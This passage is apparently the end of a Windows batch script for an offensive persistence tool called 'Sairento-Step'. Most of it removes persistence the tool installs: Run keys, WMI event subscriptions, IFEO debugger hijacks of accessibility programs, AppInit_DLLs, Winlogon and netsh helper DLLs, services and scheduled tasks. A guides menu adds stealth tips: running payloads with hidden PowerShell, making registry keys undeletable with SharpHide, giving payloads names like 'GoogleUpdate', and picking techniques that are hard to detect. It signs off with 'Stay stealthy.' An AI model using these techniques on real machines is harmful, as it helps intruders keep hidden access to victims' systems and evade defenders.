if not defined RNAME goto remove_entry
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%RNAME%" /f >nul 2>&1
echo  [+] Registry Runkey "%RNAME%" removed.
pause
goto menu

:rem_opt2
set "RNAME="
set /p "RNAME=  Enter variable name to remove: "
if not defined RNAME goto remove_entry
reg delete "HKCU\Environment" /v "%RNAME%" /f >nul 2>&1
echo  [+] Environment variable "%RNAME%" removed.
pause
goto menu

:rem_opt3
echo  [*] Resetting screensaver settings...
reg delete "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /f >nul 2>&1
reg delete "HKCU\Control Panel\Desktop" /v "ScreenSaveIsSecure" /f >nul 2>&1
reg delete "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /f >nul 2>&1
reg delete "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /f >nul 2>&1
echo  [+] ScreenSaver persistence removed.
pause
goto menu

:rem_opt4
set "FPATH="
set /p "FPATH=  Enter path to .url file to delete: "
if not defined FPATH goto remove_entry
if exist "%FPATH%" (
    del /f "%FPATH%" >nul 2>&1
    echo  [+] URL file deleted: %FPATH%
) else (
    echo  [!] File not found: %FPATH%
)
pause
goto menu

:rem_opt5
echo  [*] Removing Werfault registry key...
reg delete "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" /v "ReflectDebugger" /f >nul 2>&1
echo  [+] Werfault persistence removed.
pause
goto menu

:rem_opt6
set "REGNAME="
set /p "REGNAME=  Enter protocol handler name to remove: "
if not defined REGNAME goto remove_entry
reg delete "HKCU\Software\Classes\%REGNAME%" /f >nul 2>&1
echo  [+] Protocol handler "%REGNAME%" removed.
pause
goto menu

:rem_opt7
set "WNAME="
set /p "WNAME=  Enter WMI object name to remove: "
if not defined WNAME goto remove_entry
echo  [*] Removing WMI subscription...
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE "Filter=\"__EventFilter.Name=\\\"%WNAME%\\\"\"" DELETE >nul 2>&1
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="%WNAME%" DELETE >nul 2>&1
wmic /namespace:\\root\subscription PATH __EventFilter WHERE Name="%WNAME%" DELETE >nul 2>&1
echo  [+] WMI persistence "%WNAME%" removed.
pause
goto menu

:rem_opt8
set "TNAME="
set /p "TNAME=  Enter task name to remove: "
if not defined TNAME goto remove_entry
schtasks /delete /tn "%TNAME%" /f >nul 2>&1
echo  [+] Scheduled task "%TNAME%" removed.
pause
goto menu

:rem_opt9
set "FNAME="
set /p "FNAME=  Enter filename in Startup folder to delete: "
if not defined FNAME goto remove_entry
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if exist "%STARTUP%\%FNAME%" (
    del /f "%STARTUP%\%FNAME%" >nul 2>&1
    echo  [+] Startup entry "%FNAME%" removed.
) else (
    echo  [!] File not found: %STARTUP%\%FNAME%
)
pause
goto menu

:rem_opt10
set "TARGET="
set /p "TARGET=  Enter target exe name to remove IFEO for (e.g. sethc.exe): "
if not defined TARGET goto remove_entry
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%TARGET%" /v "Debugger" /f >nul 2>&1
echo  [+] IFEO Debugger for "%TARGET%" removed.
pause
goto menu

:rem_opt11
echo  [*] Disabling AppInit_DLLs...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 0 /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /f >nul 2>&1
echo  [+] AppInit_DLLs persistence removed.
pause
goto menu

:rem_opt12
set "SNAME="
set /p "SNAME=  Enter service name to remove: "
if not defined SNAME goto remove_entry
sc stop "%SNAME%" >nul 2>&1
sc delete "%SNAME%" >nul 2>&1
echo  [+] Service "%SNAME%" removed.
pause
goto menu

:rem_opt13
set "WNAME="
set /p "WNAME=  Enter Winlogon Notify key name to remove: "
if not defined WNAME goto remove_entry
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\%WNAME%" /f >nul 2>&1
echo  [+] Winlogon Helper DLL "%WNAME%" removed.
pause
goto menu

:rem_opt14
set "EPATH="
set /p "EPATH=  Enter DLL path to remove from netsh helpers: "
if not defined EPATH goto remove_entry
netsh delete helper "%EPATH%" >nul 2>&1
echo  [+] Netsh helper "%EPATH%" removed.
pause
goto menu

:rem_opt15
echo  [*] Restoring original accessibility feature...
set "SYS32=%WINDIR%\System32"
set "TARGET="
set /p "TARGET=  Enter target to restore (e.g. sethc.exe): "
if not defined TARGET goto remove_entry
if exist "%SYS32%\%TARGET%.bak" (
    copy /y "%SYS32%\%TARGET%.bak" "%SYS32%\%TARGET%" >nul 2>&1
    del /f "%SYS32%\%TARGET%.bak" >nul 2>&1
    echo  [+] Original %TARGET% restored from backup.
) else (
    echo  [!] No backup found for %TARGET%.
)
pause
goto menu


:: ============================================================
::  REMOVE ALL PERSISTENCE
:: ============================================================
:remove_all
cls
echo.
echo  ======================================================
echo  WARNING: This will attempt to remove ALL persistence
echo  entries created by this tool. This is destructive.
echo  ======================================================
echo.
set /p "CONFIRM=  Are you sure? (yes/no): "
if /i not "%CONFIRM%"=="yes" goto menu

echo.
echo  [*] Removing Registry Runkey entries...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f >nul 2>&1

echo  [*] Removing Environment variables...
reg delete "HKCU\Environment" /v "sairento_persist" /f >nul 2>&1

echo  [*] Resetting ScreenSaver settings...
reg delete "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /f >nul 2>&1
reg delete "HKCU\Control Panel\Desktop" /v "ScreenSaveIsSecure" /f >nul 2>&1
reg delete "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /f >nul 2>&1
reg delete "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /f >nul 2>&1

echo  [*] Removing Werfault key...
reg delete "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" /v "ReflectDebugger" /f >nul 2>&1

echo  [*] Disabling AppInit_DLLs...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 0 /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /f >nul 2>&1

echo  [*] Removing IFEO entries...
for %%t in (sethc.exe utilman.exe osk.exe narrator.exe magnify.exe displayswitch.exe) do (
    reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%t" /v "Debugger" /f >nul 2>&1
)

echo  [*] Clearing persistence log...
if exist "%LOGFILE%" del /f "%LOGFILE%" >nul 2>&1

echo.
echo  [+] All persistence entries have been processed.
echo  [!] Note: Some entries may require manual cleanup depending
echo      on what was deployed and with what privileges.
echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  GUIDES & INFO
:: ============================================================
:guides
cls
echo.
echo  ======================================================
echo              Guides ^& Information
echo  ======================================================
echo.
echo  [1] Undetectable Executables
echo      Use: cmd.exe /c start "" "C:\path\to\payload.exe"
echo      Or:  powershell -WindowStyle Hidden -Command "& 'C:\payload.exe'"
echo.
echo  [2] SharpHide - Undeletable Registry Keys
echo      sharphide.exe action=create keyvalue="C:\payload.exe"
echo.
echo  [3] Registry Execution Order (Default Apps)
echo      .COM .EXE .BAT .CMD .VBS .VBE .JS .JSE .WSF .WSH .MSC
echo.
echo  [4] Technique Selection Guide
echo      No Admin:    Options 1-4, 6, 8-9 (HKCU / user-level)
echo      With Admin:  All options (including HKLM techniques)
echo.
echo  [5] Stealth Tips
echo      - Use legitimate-sounding names (e.g. "GoogleUpdate")
echo      - Place payloads in inconspicuous directories
echo      - Use .scr extension for screensaver technique
echo      - WMI persistence survives reboots and is hard to detect
echo      - Scheduled Tasks blend with legitimate system tasks
echo.
echo  [6] Common Troubleshooting
echo      - "Access denied" = Run as Administrator
echo      - "File not found" = Check payload path exists
echo      - "Invalid characters" = Use only A-Z, 0-9, dash, underscore
echo      - WMI issues = Check WMI service is running (winmgmt)
echo.
echo  ======================================================

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  HELPER FUNCTIONS
:: ============================================================

:log_entry
:: %~1 = technique name, %~2 = details
set "TIMESTAMP=%date% %time:~0,8%"
echo %TIMESTAMP% ^| %~1 ^| %~2 >> "%LOGFILE%"
goto :eof


:end
cls
echo.
echo  Thank you for using Sairento-Step v%VERSION%.
echo  Stay stealthy.
echo.
exit /b 0
